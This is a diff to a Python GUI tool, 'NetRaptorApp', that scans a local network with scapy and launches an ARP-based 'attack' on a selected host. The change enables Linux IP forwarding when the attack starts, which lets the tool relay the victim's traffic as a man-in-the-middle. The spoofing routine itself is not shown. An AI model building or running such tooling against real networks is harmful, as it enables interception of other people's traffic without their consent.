@@ -1,8 +1,18 @@
+import os
 import tkinter as tk
 from tkinter import messagebox
 from scapy.all import ARP, Ether, srp, send
 import threading
 import time
+
+# Enable IP forwarding (Linux systems)
+def enable_ip_forwarding():
+    if os.name == 'posix':
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+def disable_ip_forwarding():
+    if os.name == 'posix':
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
 # Define the main application class
 class NetRaptorApp:
@@ -92,6 +102,9 @@ class NetRaptorApp:
             messagebox.showinfo("Scan Complete", f"Found {len(self.hosts)} host(s).")
 
     def start_attack(self):
+        # Enable IP forwarding
+        enable_ip_forwarding()
+        
         # Target Selection
         target = self.selected_host.get()
         if target == "Select a host (Target)":
@@ -124,8 +137,10 @@ class NetRaptorApp:
         self.attack_thread.start()
 
     def stop_attack(self):
-        # Stop the attack
+        # Stop the attack and disable IP forwarding
         self.running = False
+        disable_ip_forwarding()
+        
         if self.attack_thread:
             self.attack_thread.join()  # Wait for the thread to finish
         
